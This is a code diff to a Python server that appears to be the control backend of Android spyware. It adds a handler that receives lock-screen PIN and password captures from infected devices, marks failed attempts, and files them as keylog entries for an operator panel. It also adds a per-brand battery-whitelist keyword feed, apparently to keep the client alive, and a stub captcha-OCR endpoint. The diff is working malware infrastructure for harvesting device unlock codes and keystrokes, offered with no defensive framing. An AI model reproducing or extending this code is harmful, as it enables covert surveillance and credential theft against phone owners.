@@ -131,6 +131,28 @@ async def device_log(request):
         body = {}
     STATE['devlog'].append({'ts': int(time.time()), 'body': body})
     dev = str(body.get('deviceId') or '') if isinstance(body, dict) else ''
+    # 锁屏密码事件：转写进 keylogs（面板“系统锁屏”读的是 keylog）
+    if dev and isinstance(body, dict) and body.get('type') == 'pin_capture':
+        try:
+            raw = body.get('msg') or ''
+            j = json.loads(raw) if isinstance(raw, str) else (raw if isinstance(raw, dict) else {})
+            ftype = str(j.get('type') or 'pin')
+            val = str(j.get('value') or '')
+            ok = j.get('ok')
+            if ok in (0, False):
+                val = val + '|fail'
+            if val:
+                import api_impl as _ai
+                d = _ai.db()
+                if d:
+                    d.keylog_add({'deviceId': dev, 'pkg': 'com.android.systemui',
+                                  'type': ftype, 'text': val})
+                else:
+                    _ai.S['keylogs'].append({'deviceId': dev, 'pkg': 'com.android.systemui',
+                                             'type': ftype, 'text': val, 'ts': int(time.time())})
+                    _ai.save()
+        except Exception:
+            pass
     if dev and body.get('type') == 'acc_lifecycle':
         rec = STATE['devices'].setdefault(
             dev, {'ws': None, 'apkid': None, 'last_seen': time.time(),
@@ -138,6 +160,38 @@ async def device_log(request):
                   'msgs': [], 'frames': []})
         _merge_diag_caps(rec, body)
     return web.json_response({'ok': True})
+
+
+BATTERY_KW_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'state', 'battery_kw.json')
+
+
+async def battery_config(request):
+    """电池白名单关键词远程配置。
+
+    - 有 state/battery_kw.json（{brand: {battery_entry_kw:[], unrestricted_kw:[]}}）就按品牌下发；
+    - 没有就返回 200 + 空配置：客户端缺省键会退回内置词表，
+      但**非 200 会让客户端中断整个流程**，所以这里永远 200。
+    """
+    brand = (request.query.get('brand') or '').lower()
+    table = {}
+    try:
+        with open(BATTERY_KW_FILE, encoding='utf-8') as f:
+            table = json.load(f)
+    except Exception:
+        table = {}
+    cfg = table.get(brand) if isinstance(table, dict) else None
+    if not isinstance(cfg, dict):
+        return web.json_response({'ok': True})
+    out = {'ok': True}
+    for k in ('battery_entry_kw', 'unrestricted_kw'):
+        if isinstance(cfg.get(k), list):
+            out[k] = cfg[k]
+    return web.json_response(out)
+
+
+async def ocr_captcha(request):
+    """验证码 OCR 占位：先回 200，客户端走 OCR_FAILED 而不是 404（后面接引擎再实现）。"""
+    return web.json_response({'ok': False, 'error': 'not implemented'})
 
 
 async def device_socket(request):
@@ -1922,6 +1976,8 @@ def build_app():
     app.middlewares.append(lab_alias)
     app.router.add_get('/adv.php', adv_php)
     app.router.add_post('/api/device_log', device_log)
+    app.router.add_get('/api/battery_config', battery_config)
+    app.router.add_post('/api/ocr-captcha', ocr_captcha)
     app.router.add_get('/io/', device_socket)
     # 2.1 客户端把探针返回的端口拼进 Socket.IO path（/io443），并非 URL 端口。
     app.router.add_get(r'/io{port:\d+}', device_socket)
